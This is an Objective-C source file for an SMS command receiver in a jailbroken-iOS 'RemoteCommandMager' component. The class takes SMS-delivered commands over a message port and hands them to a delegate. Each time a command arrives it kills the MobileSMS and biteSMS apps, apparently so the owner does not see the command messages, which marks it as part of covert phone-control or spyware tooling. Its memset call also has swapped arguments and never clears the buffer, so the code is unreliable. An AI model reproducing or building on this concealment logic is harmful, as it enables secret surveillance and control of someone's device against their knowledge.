/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SMSCommandReceiver
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  11/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "SMSCmdReceiver.h"
#import "SocketIPCReader.h"
#import "DefStd.h"
#import "SMSCmd.h"
#import "SpringBoardServices.h"

@interface SMSCmdReceiver (private)
- (NSString *) getFrontMostApplication;
@end

@implementation SMSCmdReceiver

@synthesize mSMSCmdDelegate;

/**
- Method Name:init
- Purpose: This method is used to initialize the SMSCommandReceiver class.
- Argument list and description: No Argument
- Return type and description: self (SMSCommandReceiver instance)
*/

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

/**
 - Method name:startMonitoring
 - Purpose: This method is used for start operation for receiving sms command.
 - Argument list and description: No argument
 - Return b and description: No Return
*/

- (void) startMonitoring {
	if (!mMessagePortIPCReader) { // Make sure we not create new object if it's already created
		mMessagePortIPCReader = [[MessagePortIPCReader alloc] initWithPortName:kSMSCommandPort
													withMessagePortIPCDelegate:self];
		[mMessagePortIPCReader start];
	    DLog (@"startMonitoring...");
	}
}


/**
 - Method Name:stopMonitoring
 - Purpose: This method is used for stop operation for receiving sms command.
 - Argument list and description: No argument
 - Return Type and description: No Return
*/

- (void) stopMonitoring {
	if (mMessagePortIPCReader) {
		[mMessagePortIPCReader stop];
		[mMessagePortIPCReader release];
		mMessagePortIPCReader = nil;
	}
	DLog (@"stopMonitoring....");
}

/**
 - Method name:didReceivedSMSData
 - Purpose: This method is invoked when receiving sms command.
 - Argument list and description: aData (NSData *)
 - Return type and description: No Return
*/

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@"dataDidReceivedFromMessagePort...");
    
#if TARGET_OS_IPHONE
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 6) {
//		if ([[self getFrontMostApplication] isEqualToString:@"com.apple.MobileSMS"]) {
			system("killall MobileSMS"); // To clear the cache in MobileSMS UI
			system("killall biteSMS"); // To clear the cache in biteSMS UI
//		}
	}
#endif
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    NSDictionary *dictionary = [[unarchiver decodeObjectForKey:kMessageMonitorKey] retain];
    [unarchiver finishDecoding];
    SMSCmd *command=[[SMSCmd alloc] init];
	[command setMMessage:[dictionary objectForKey:kSMSTextKey]];
	NSArray *recipientInfo=[dictionary objectForKey:kMessageSenderKey];
	if ([recipientInfo count]) 	[command setMSenderNumber:[recipientInfo objectAtIndex:0]];
 	if (([[self mSMSCmdDelegate] respondsToSelector:@selector(didSMSCommandReceived:)])) {
		[[self mSMSCmdDelegate] performSelector:@selector(didSMSCommandReceived:) withObject:command];
	}
	[command release];
    [dictionary release];
	[unarchiver release];
}

- (NSString *) getFrontMostApplication {
#if TARGET_OS_IPHONE
	mach_port_t *p = (mach_port_t *) SBSSpringBoardServerPort();
	char frontmostAppS[256];
	memset(frontmostAppS, sizeof(frontmostAppS), 0);
	SBFrontmostApplicationDisplayIdentifier(p,frontmostAppS);
	
	NSString * frontmostApp = [NSString stringWithFormat:@"%s",frontmostAppS];
	DLog(@"Frontmost app is %@", frontmostApp);
	return (frontmostApp);
#else
    return nil;
#endif
    
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return Type and Description: No Return
*/

- (void) dealloc {
	if (mMessagePortIPCReader) {
		[mMessagePortIPCReader release];
	}
	DLog (@"dealloc...");
	[super dealloc];
}

@end
